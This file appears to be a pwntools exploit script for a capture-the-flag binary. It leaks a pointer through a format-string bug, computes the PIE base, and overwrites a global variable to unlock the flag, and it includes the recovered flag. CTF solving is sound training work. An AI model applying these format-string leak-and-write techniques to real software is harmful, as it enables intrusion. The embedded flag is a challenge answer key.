#!/usr/bin/python3
from pwn import *
gs = '''
continue
'''
elf = context.binary = ELF('./chal')
context.terminal = ['tmux', 'splitw', '-hp', '70']

def start():
    if args.GDB:
        return gdb.debug('./chal', gdbscript=gs)
    if args.REMOTE:
        return remote('1chal.amt.rs', 1338)
    else:
        return process('./chal')
r = start()
#========= exploit here ===================

#leak pie
r.sendline("%15$p")
r.recvline()
leak = int(r.recvline().split(b" ")[1], 16)
log.info(hex(leak))

base = leak - 0x1678

log.info(f"base = {hex(base)}")

elf.address = base

log.info(f"is_mother_bear = {hex(elf.sym.is_mother_bear)}")

r.recvuntil(b"say:")

payload = fmtstr_payload(22,{elf.sym.is_mother_bear:0xbad0bad})


r.sendline(payload)

r.recvuntil(b"say:")
r.sendline(b"flag")
#amateursCTF{bearsay_mooooooooooooooooooo?}

#========= interactive ====================
r.interactive()
